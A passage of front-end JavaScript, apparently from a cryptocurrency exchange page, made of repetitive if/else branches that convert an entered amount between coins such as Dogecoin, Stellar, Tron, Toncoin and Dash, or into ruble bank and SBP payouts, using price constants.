                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XRP ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_DOGE ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOGE ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_ETC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ETC ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_XLM ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_XLM ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Tron (TRX)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_TRX ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TRX ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_TON ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_DASH ).toFixed(6);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_ZEC ).toFixed(6);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_BNB ).toFixed(4);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_TON ) / PRICE_XMR ).toFixed(6);
                    }
                } else if ( valuteFirstName == 'Dash (DASH)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_DASH ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_TON ).toFixed(6);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_ZEC ).toFixed(6);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_BNB ).toFixed(4);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DASH ) / PRICE_XMR ).toFixed(6);
                    }
                } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
